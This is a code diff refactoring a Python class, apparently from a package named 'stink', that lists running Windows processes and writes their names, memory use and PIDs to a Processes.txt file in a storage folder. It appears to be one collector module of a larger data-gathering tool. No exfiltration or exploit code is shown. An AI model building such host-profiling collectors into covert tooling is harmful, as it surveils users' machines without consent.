@@ -1,5 +1,5 @@
 from time import sleep
-from os import mkdir, path
+from os import makedirs, path
 from ctypes import windll, sizeof, byref
 
 from stink.helpers import functions
@@ -10,16 +10,16 @@ class Processes:
 
     def __init__(self, storage_path: str, folder: str, errors: bool):
 
-        self.storage_path = storage_path
-        self.folder = folder
-        self.errors = errors
+        self.__storage_path = storage_path
+        self.__folder = folder
+        self.__errors = errors
 
     def __create_folder(self):
 
-        storage_path = rf"{self.storage_path}\{self.folder}"
+        storage_path = rf"{self.__storage_path}\{self.__folder}"
 
         if not path.exists(storage_path):
-            mkdir(storage_path)
+            makedirs(storage_path, exist_ok=True)
 
     def __get_system_processes(self):
 
@@ -50,7 +50,7 @@ class Processes:
                 kernel32.CloseHandle(process_handle)
                 sleep(0.00001)
 
-        with open(rf"{self.storage_path}\{self.folder}\Processes.txt", "a", newline="", encoding="utf-8") as processes:
+        with open(rf"{self.__storage_path}\{self.__folder}\Processes.txt", "a", newline="", encoding="utf-8") as processes:
             processes.write("\n".join(line for line in functions.create_table(["Name", "Memory", "PID"], results)))
 
     def run(self):
@@ -61,4 +61,4 @@ class Processes:
             self.__get_system_processes()
 
         except Exception as e:
-            if self.errors is True: print(f"[Processes]: {repr(e)}")
+            if self.__errors is True: print(f"[Processes]: {repr(e)}")
